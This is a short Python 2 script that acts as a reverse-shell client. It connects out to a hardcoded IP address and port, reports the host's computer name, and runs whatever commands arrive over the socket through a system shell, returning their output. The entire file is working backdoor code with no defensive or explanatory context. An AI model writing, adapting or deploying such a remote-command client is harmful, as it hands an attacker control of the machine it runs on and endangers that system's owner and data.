import socket, os, subprocess

def connect():
	os.system('cls')
	global host
	global port
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = '192.168.65.137'
	port = 1133

	try:
		print '[!] trying to connect to %s:%s' % (host, port)
		s.connect((host, port))
		print '[!] Connection established.'
		s.send(os.environ['COMPUTERNAME'])
	except:
		print 'Could not connect'

def receive():
	try:
		#print "Start receive func. . . "
		receive = s.recv(1024)
		if receive == 'quit':
			s.close()
		#elif receive[0:5] == 'shell':
		elif receive[0:]:
			proc2 = subprocess.Popen(receive[0:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			stdout_value = proc2.stdout.read() + proc2.stderr.read()
			args = stdout_value
		else:
		 	args = 'no input was given.'
		send(args)
	except Exception as e:
		print "Session dead.\n"

def send(args):
	send = s.send(args)
	receive()

connect()
receive()
s.close()